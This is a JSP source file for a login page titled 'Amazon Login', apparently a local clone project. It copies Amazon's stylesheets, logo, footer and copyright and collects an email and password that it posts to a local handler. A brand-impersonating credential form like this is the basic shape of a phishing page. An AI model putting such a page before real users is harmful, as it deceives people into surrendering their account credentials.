<%@ page language="java" contentType="text/html; charset=ISO-8859-1"
    pageEncoding="ISO-8859-1"%>
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
<title dir="ltr">Amazon Login</title>
<link rel="stylesheet" href="https://images-na.ssl-images-amazon.com/images/I/61gbb09bfIL._RC|11Fd9tJOdtL.css,21ULbzscqzL.css,31Q3id-QR0L.css,31QszevPBSL.css_.css#AUIClients/AmazonUI.min">
<link rel="stylesheet" href="https://images-na.ssl-images-amazon.com/images/G/01/AUIClients/AuthenticationPortalAssets-94ded7628fed721f90d0747ae14bd55bda0a4bf9._V2_.css#AUIClients/AuthenticationPortalAssets.secure.min">
<link rel="stylesheet" href="https://images-na.ssl-images-amazon.com/images/G/01/AUIClients/CVFAssets-e91ba5c6e67c58c7f9c4c413fa67697feade389e._V2_.css#AUIClients/CVFAssets.secure.min">
</head>
<body style="font-family: Amazon Ember; Arial:sans-serif; line-height: 19px;  font-size: 13px; line-height: 19px; color: #111;">

<form action="UserLogin.jsp" method="post">
		<div id="a-page" style="display: block;">
			<div class="a-section " style= " width: 320px; margin: auto; padding: 14px 18px!important; padding-top: 14px; padding-right: 18px; padding-bottom: 14px; padding-left: 18px; width: 350px;">
				<div class="a-section a-spacing a-text-center" style= "margin: auto; width: 320px;">
					<div class="a-section spacing-medium a-text-center">
						<a class="link-nav-icon" tabindex= "-1" href= "http://localhost:8080/akshay/NewFile.jsp">
							<i class= "icon icon-logo">
								<span class= "a-icon" style="background-position: -5px -130px; height: 31px; width: 103px; background-size: 400px 670px; background-repeat: no-repeat;  display: inline-block;
  vertical-align: top;" ></span>
							</i>
							<i class="a-icon a-icon-domain-in a-icon-domain"></i>
						</a>
					</div>	
				</div>
				<div class="a-section a-spacing-base auth-pagelet-container">
            
                <div id="auth-cookie-warning-message" class="a-box a-alert a-alert-warning">
				<div class="a-box-inner a-alert-container"><h4 class="a-alert-heading">Please Enable Cookies to Continue</h4>
				<i class="a-icon a-icon-alert"></i>
				<div class="a-alert-content">
                  <p>
                    <a class="a-link-normal" href="/gp/help/customer/display.html/ref=ap_cookie_error_help?">
                      
                    </a>
                  </p>
                </div></div>
				</div>
				</div>
				
				<div class= "a-section auth-pagelet-container" style= " width: 400px; margin: auto; padding: 14px 18px!important;">
					<div class= "a-section auth-pagelet-container">
						<form id= "ap_register_form" name= "register" method= "post" style="display: block; margin-top: 0em" class="ap_ango_default auth-validate-form-moa auth-real-time-validation fwcim-form">
							<div class= "a-box a-spacing-extra-large" style="center">	
							<div class="a-box-inner">
								<h1 style="margin-bottom: 10px!important; font-weight: 400; font-size: 28px; line-height: 1.2;">Login</h1>
								<div class="a-row a-spacing-base">
									<label for="ap_email" class="a-form-label">Email or mobile phone number</label>
									<input type="email" maxlength="128" id="ap_email" name="useremail" tabindex="1" class="a-input-text a-span12 auth-autofocus auth-required-field">
									<label for="ap_password" class="a-form-label">Password</label>
									<input type="password" maxlength="128" id="ap_password" name="password" tabindex="1" class="a-input-text a-span12 auth-autofocus auth-required-field">
									</div>
							
								<br>
								<span id=""><!-- will be used for modal-->
								<span class="a-button-inner" style="  width: 100%!important;   background: #f0c14b;
    border-color: #a88734 #9c7e31 #846a29;   border-radius: 3px; border-style: solid;  border-width: 1px; cursor: pointer; display: inline-block; padding: 0; text-align: center;  text-decoration: none!important;
    vertical-align: middle;">
				
									<input id="continue" tabindex="5" class="a-button-input" type="submit" aria-labelledby="continue-announce"onclick="window.location.href='http://localhost:8080/akshay/home.jsp'"><span id="continue-announce" class="a-button-text" aria-hidden="true">Continue </span>
								</span>
									</span>
							</div>
							<div class="a-row">
										Need Help?
										<a class="link" href="amazonsignup.jsp">Sign Up</a>
									</div>
							</div>		
						</form>
					</div>
				</div>
			</div>
			<div id="right-2">
      </div>
			
			<div class="a-section a-spacing-top-extra-large auth-footer">
        



	<div class="a-divider a-divider-section"><div class="a-divider-inner"></div></div>
		<div class="a-section a-spacing-small a-text-center a-size-mini">
				<span class="auth-footer-seperator"></span>
			<a class="a-link-normal" target="_blank" rel="noopener noreferrer" href="/gp/help/customer/display.html/ref=ap_desktop_footer_cou?ie=UTF8&amp;nodeId=200545940">
						Conditions of Use</a>
						<span class="auth-footer-seperator"></span>
   <a class="a-link-normal" target="_blank" rel="noopener noreferrer" href="/gp/help/customer/display.html/ref=ap_desktop_footer_privacy_notice?ie=UTF8&amp;nodeId=200534380">
      Privacy Notice </a>
    <span class="auth-footer-seperator"></span>
    <a class="a-link-normal" target="_blank" rel="noopener noreferrer" href="/help">
      Help
    </a>
    <span class="auth-footer-seperator"></span>
</div>
<div class="a-section a-spacing-none a-text-center">
  <span class="a-size-mini a-color-secondary">
    � 1996-2018, Amazon.com, Inc. or its affiliates
  </span>
</div>
      </div>
		</div>
		<div id="be" style="display: none; visiblity: hidden; ">
			<form name="ue_backdetect" action="get">
			<input type="hidden" name="ue_back" value="2">
			</form>
				
		</div>
		<div class="fwcim-container"></div>
		<div id="a-popover-root" style="z-index:-1;position:absolute;"></div>
</form>
</body>
</html>